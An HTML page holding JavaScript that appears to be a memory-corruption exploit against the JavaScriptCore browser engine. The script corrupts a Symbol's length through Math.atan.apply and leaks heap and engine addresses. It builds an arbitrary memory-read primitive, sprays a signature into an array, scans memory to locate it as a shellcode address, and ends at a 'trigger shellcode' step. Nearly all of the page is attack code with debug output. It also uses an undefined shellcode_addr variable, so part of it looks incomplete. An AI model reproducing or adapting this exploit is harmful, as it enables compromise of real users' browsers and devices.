<html>

<textarea id="alltext" rows="50" cols="40">
*** DUMP MESSAGE HERE ***

</textarea>
<script>
function appendMessage(msg) {
    var msg_with_line = msg + '\n';
    document.getElementById("alltext").value += msg_with_line;
}

function printMessageInDbg(msg) {
    Math.atan.apply(msg);
}

// define mdprint here
mdprint = function (msg) {
    appendMessage(msg);
    // printMessageInDbg(msg);
}

//
function describe(obj) {
    mdprint('[Not Implemented] describe function');
}
</script>

<script src='utils.js'></script>
<script src='int64.js'></script>

<script>
function makeMemcpy() {
    var p;
    function g(){
        p = g.caller;
        return 7;
    }

    var a = [1, 2, 3];
    Object.defineProperty(a, "0", {get : g});
    a.concat([4]);
    return p;
}

function modifySymbolLength(symbol) {
    Math.atan.apply(symbol);
}

var brutedMemcpy = makeMemcpy();

let leaked_obj = Symbol.for("AAAAAAAA");
modifySymbolLength(leaked_obj);

// Math.abs.apply(symbol);

let leaked_content = leaked_obj.toString();

function readBytesRel(size, outUint8Array) {
    if (size == undefined) size = 8;
    if (outUint8Array == undefined) outUint8Array = new Uint8Array(size);
    for (let i = 0; i < size; i++) {
        outUint8Array[i] = leaked_content.charCodeAt(7 + i);
    }
    return outUint8Array;
}

function leakStringBase() {
    let u8Array = readBytesRel(28);
    mdprint('u8Array @ ' + u8Array);
    let leak = readBytesRel(28).slice(-8);
    mdprint('addrArray @ ' + leak);
    return Sub(new Int64(leak), new Int64('0x20'));
}

mdprint('leaking string addr...');
let leaked_str = leakStringBase();
mdprint('string @ ' + leaked_str);

function readBytes(target, sz, out) {
    if (sz  == undefined) sz = 8;
    if (out == undefined) out = new Uint8Array(sz);

    let target_dbl;
    switch (typeof target) {
        case 'string':
            target_dbl = new Int64(target).asDouble();
            break;
        case 'object':
            target_dbl = target.asDouble();
            break;
        default:
            throw 'unknown target type';
    }

    let x = Symbol('xxxxxxxxx');
    modifySymbolLength(x);
    
    let s = x.toString();
    // strlen('Symbol(') == 7
    try {
        for (let i = 0; i < sz; i++) {
            let z = s.charCodeAt(7 + i);
            if (z > 0xff) throw 'char out of range';
            out[i] = z;
        }
    } catch (e) {
        let out_idx = 0;
        for (let i = 0; out_idx < sz; i++) {
            let z = s.charCodeAt(7 + i);
            out[out_idx++] = z & 0xff;
            out[out_idx++] = (z >> 8) & 0xff;
        }
    }
    return out;
}

function convertBuffer2Hex(buffer) { // buffer is an ArrayBuffer
  return 'HEX @ ' + Array.prototype.map.call(new Uint8Array(buffer), x => ('00' + x.toString(16)).slice(-2)).join('');
}

var leaked_ss = leaked_str+'';
mdprint('leaked string address @ ' + leaked_ss);
var leaked_str_aligned_addr = new Int64(leaked_ss.substr(0, leaked_ss.length-3)+'010');
mdprint('leaked aligned address @ ' + leaked_str_aligned_addr);
var leaked_jsc_addr = new Int64(readBytes(leaked_str_aligned_addr));
mdprint('leaked JSC address @ ' + leaked_jsc_addr);
var leaked_jsc_code_addr = Sub(leaked_jsc_addr, new Int64('0x726d88'));
mdprint('leaked JSC text section @ ' + leaked_jsc_code_addr);
mdprint(convertBuffer2Hex(readBytes(leaked_jsc_code_addr, 0x50)));
// var leaked_libc_text_addr = Sub(leaked_jsc_text_addr, new Int64('0x969000'));
// mdprint('leaked libc text section: ' + leaked_libc_text_addr);
// mdprint(convertBuffer2Hex(readBytes(leaked_libc_text_addr, 0x50)));

let known_loc = [];
for (let i = 0; i < 0xf8; i += 8) known_loc.push(new Int64('0x5151515151515151').asDouble());

// write signature code
var signature = new Int64('0xba0dc0deba0dc0de');
known_loc[0] = signature.asDouble();

Math.abs.apply(known_loc);

var leaked_nearby_array_addr = new Int64(readBytes(Sub(leaked_str, new Int64('0x2bc'))));
mdprint('leaked_nearby_array_addr @ ' + leaked_nearby_array_addr);

function findOffsetByBytes(data, signature) {
    function findOffset(data, signature) {
        for (let i = 0; i < data.length - signature.length; i++) {
            let found = true;
            for (let j = 0; j < signature.length && found; j++) {
                if (data[i + j] != signature[j]) found = false;
            }
            if (found) return i;
        }
        throw 'findOffset() could not find @ ' + signature;
    }
    return '0x' + findOffset(data, signature).toString(16);
}

function searchShellcodeSigByBytes(base, data, signature) {
    return Add(base, new Int64(findOffsetByBytes(data, signature)));
}

mdprint('read content from leaked_nearby_array_addr...');
let memory_area = readBytes(leaked_nearby_array_addr, 0xfffff);
mdprint('match signature byte by byte...');
var signature_addr = searchShellcodeSigByBytes(leaked_nearby_array_addr, memory_area, signature.bytes());
mdprint('signature memory content\n' + convertBuffer2Hex(readBytes(signature_addr, 0x50)));

// trigger shellcode
mdprint('shellcode address @ ' + shellcode_addr);

Math.abs(1);

</script>
</html>
